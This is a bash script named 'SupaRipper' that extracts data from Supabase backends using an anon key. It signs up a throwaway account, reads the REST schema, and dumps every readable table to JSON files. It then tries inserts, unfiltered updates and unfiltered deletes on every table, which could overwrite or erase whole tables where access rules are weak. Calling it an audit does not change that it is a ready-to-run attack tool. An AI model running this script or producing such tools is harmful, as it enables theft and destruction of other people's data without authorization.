#!/bin/bash
# SupaRipper - Supabase Data Extractor

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Default values
URL=""
APIKEY=""
EMAIL="suparipper_$(date +%s)@gmail.com"
PASSWORD="SupaRipperPassword123!"
OUTPUT_DIR="suparipper_results"

# Usage function
usage() {
    echo -e "${YELLOW}Usage: $0 -u <SUPABASE_URL> -k <SUPABASE_KEY> [-e <EMAIL>] [-p <PASSWORD>]${NC}"
    echo -e "Example: $0 -u https://xyz.supabase.co -k your_anon_key -e test@gmail.com -p MyPass123"
    exit 1
}

# Parse flags
while getopts "u:k:e:p:" opt; do
    case $opt in
        u) URL=$OPTARG ;;
        k) APIKEY=$OPTARG ;;
        e) EMAIL=$OPTARG ;;
        p) PASSWORD=$OPTARG ;;
        *) usage ;;
    esac
done

if [[ -z "$URL" || -z "$APIKEY" ]]; then
    usage
fi

# Sanitize URL (remove trailing slash)
URL=$(echo "$URL" | sed 's:/*$::')

echo -e "${BLUE}[*] SupaRipper initialized for: ${URL}${NC}"
mkdir -p "$OUTPUT_DIR"

# 1. Check Registration Endpoint
check_registration() {
    echo -e "${BLUE}[*] Checking if registration is open...${NC}"
    echo -e "${BLUE}[...] Attempting signup with: ${EMAIL}${NC}"

    local response=$(curl -s -X POST "${URL}/auth/v1/signup" \
        -H "apikey: ${APIKEY}" \
        -H "Authorization: Bearer ${APIKEY}" \
        -H "Content-Type: application/json" \
        -d "{ \"email\": \"${EMAIL}\", \"password\": \"${PASSWORD}\" }")

    if echo "$response" | jq -e '.id' >/dev/null; then
        echo -e "${RED}[!] Open Registration detected!${NC}"
        echo "$response" | jq . > "${OUTPUT_DIR}/signup_success.json"
        
        # Check if auth is possible (login) but don't use the token for the rest of the script
        echo -e "${BLUE}[*] Checking if login is possible with credentials...${NC}"
        local login_response=$(curl -s -X POST "${URL}/auth/v1/token?grant_type=password" \
            -H "apikey: ${APIKEY}" \
            -H "Authorization: Bearer ${APIKEY}" \
            -H "Content-Type: application/json" \
            -d "{ \"email\": \"${EMAIL}\", \"password\": \"${PASSWORD}\" }")
        
        if echo "$login_response" | jq -e '.access_token' >/dev/null; then
            echo -e "${GREEN}[+] Login successful! (Auth is possible)${NC}"
            echo "$login_response" | jq . > "${OUTPUT_DIR}/auth_success.json"
        else
            echo -e "${YELLOW}[-] Registration succeeded but login failed (possibly needs email confirmation).${NC}"
        fi
    else
        echo -e "${GREEN}[+] Registration seems closed or credentials blocked.${NC}"
        if [[ "$VERBOSE" -eq 1 ]]; then echo "$response"; fi
    fi
}

# 2. Discover Tables and Functions via OpenAPI
discover_schema() {
    echo -e "${BLUE}[*] Fetching OpenAPI schema...${NC}"
    local schema=$(curl -s -X GET "${URL}/rest/v1/" \
        -H "apikey: ${APIKEY}" \
        -H "Authorization: Bearer ${APIKEY}")

    if [[ -z "$schema" || "$schema" != "{"* ]]; then
        echo -e "${RED}[-] Could not fetch or parse OpenAPI schema. Access might be restricted.${NC}"
        return
    fi

    echo "$schema" | jq . > "${OUTPUT_DIR}/schema.json" 2>/dev/null

    # Extract tables
    TABLES=$(echo "$schema" | jq -r '.definitions | keys[]' 2>/dev/null)
    # Extract RPCs (functions)
    FUNCTIONS=$(echo "$schema" | jq -r '.paths | keys[]' | grep '^/rpc/' | sed 's#/rpc/##' 2>/dev/null)

    echo -e "${GREEN}[+] Discovered $(echo "$TABLES" | wc -w) tables.${NC}"
    if [[ -n "$FUNCTIONS" ]]; then
        echo -e "${GREEN}[+] Discovered functions:${NC}"
        echo "$FUNCTIONS" | sed 's/^/  - /'
        echo "$FUNCTIONS" > "${OUTPUT_DIR}/functions_list.txt"
    fi
}

# 3. Test Table Accessibility and CRUD
test_tables() {
    echo -e "${BLUE}[*] Testing table permissions (using provided API Key)...${NC}"
    
    for table in $TABLES; do
        echo -e "${BLUE}-----------------------------------${NC}"
        echo -e "${BLUE}[...] Audit: ${table}${NC}"
        
        # As requested, we stay with the provided APIKey (anon key) for consistency
        local headers=(-H "apikey: ${APIKEY}" -H "Authorization: Bearer ${APIKEY}")

        # 3.1 Test Read (GET)
        local read_resp=$(curl -s -o "${OUTPUT_DIR}/tmp_read.json" -w "%{http_code}" -X GET "${URL}/rest/v1/${table}?select=*" "${headers[@]}")
        
        if [[ "$read_resp" == "200" ]]; then
            echo -e "${RED}[!] READ: ENABLED (200 OK)${NC}"
            mv "${OUTPUT_DIR}/tmp_read.json" "${OUTPUT_DIR}/table_${table}_data.json"
        elif [[ "$read_resp" == "403" ]]; then
            echo -e "${YELLOW}[-] READ: FORBIDDEN (403)${NC}"
            rm "${OUTPUT_DIR}/tmp_read.json"
        else
            echo -e "${YELLOW}[-] READ: HTTP ${read_resp}${NC}"
            rm "${OUTPUT_DIR}/tmp_read.json"
        fi

        # 3.2 Test INSERT (POST)
        local post_resp=$(curl -s -o /dev/null -w "%{http_code}" -X POST "${URL}/rest/v1/${table}" \
            "${headers[@]}" \
            -H "Content-Type: application/json" \
            -H "Prefer: return=minimal" \
            -d '{"suparipper_test": "audit"}')
        
        if [[ "$post_resp" == "201" || "$post_resp" == "200" || "$post_resp" == "204" ]]; then
            echo -e "${RED}[!!!] INSERT: ENABLED! (HTTP ${post_resp})${NC}"
        else
            echo -e "${GREEN}[+] INSERT: PROTECTED (HTTP ${post_resp})${NC}"
        fi

        # 3.3 Test UPDATE (PATCH)
        local patch_resp=$(curl -s -o /dev/null -w "%{http_code}" -X PATCH "${URL}/rest/v1/${table}" \
            "${headers[@]}" \
            -H "Content-Type: application/json" \
            -H "Prefer: return=minimal" \
            -d '{"suparipper_test": "updated"}')
        
        if [[ "$patch_resp" == "204" || "$patch_resp" == "200" ]]; then
            echo -e "${RED}[!!!] UPDATE: ENABLED! (HTTP ${patch_resp})${NC}"
        else
            echo -e "${GREEN}[+] UPDATE: PROTECTED (HTTP ${patch_resp})${NC}"
        fi

        # 3.4 Test DELETE
        local delete_resp=$(curl -s -o /dev/null -w "%{http_code}" -X DELETE "${URL}/rest/v1/${table}" \
            "${headers[@]}" \
            -H "Prefer: return=minimal")
        
        if [[ "$delete_resp" == "204" || "$delete_resp" == "200" ]]; then
            echo -e "${RED}[!!!] DELETE: ENABLED! (HTTP ${delete_resp})${NC}"
        else
            echo -e "${GREEN}[+] DELETE: PROTECTED (HTTP ${delete_resp})${NC}"
        fi
    done
}

# Main Execution
check_registration
discover_schema
test_tables

echo -e "${GREEN}[*] Audit complete. Results saved in ${OUTPUT_DIR}/${NC}"
